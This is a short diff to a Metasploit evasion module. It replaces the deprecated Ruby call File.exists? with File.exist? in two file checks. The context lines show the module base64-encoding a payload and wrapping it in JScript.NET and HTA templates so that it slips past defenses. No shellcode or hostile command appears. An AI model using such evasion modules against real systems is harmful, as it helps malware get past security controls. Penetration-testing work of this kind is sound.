@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Evasion
     file_payload = Rex::Text.encode_base64(payload.encoded)
     evasion_shellcode_path = File.join(Msf::Config.data_directory, 'exploits', 'evasion_shellcode.js')
     jsnet_code = File.read(evasion_shellcode_path)
-    fail_with(Failure::NotFound, 'The JScript.NET file was not found.') unless File.exists?(evasion_shellcode_path)
+    fail_with(Failure::NotFound, 'The JScript.NET file was not found.') unless File.exist?(evasion_shellcode_path)
     js_file = ERB.new(jsnet_code).result(binding())
     jsnet_encoded = Rex::Text.encode_base64(js_file)
     # This is used in the ERB template
@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Evasion
     arch = ["x86", "x64"].include?(payload.arch.first) ? payload.arch.first : "anycpu"
     hta_path = File.join(Msf::Config.data_directory, 'exploits', 'hta_evasion.hta')
     hta = File.read(hta_path)
-    fail_with(Failure::NotFound, 'The HTA file was not found.') unless File.exists?(hta_path)
+    fail_with(Failure::NotFound, 'The HTA file was not found.') unless File.exist?(hta_path)
     hta_file = ERB.new(hta).result(binding())
     file_create(hta_file)
   end
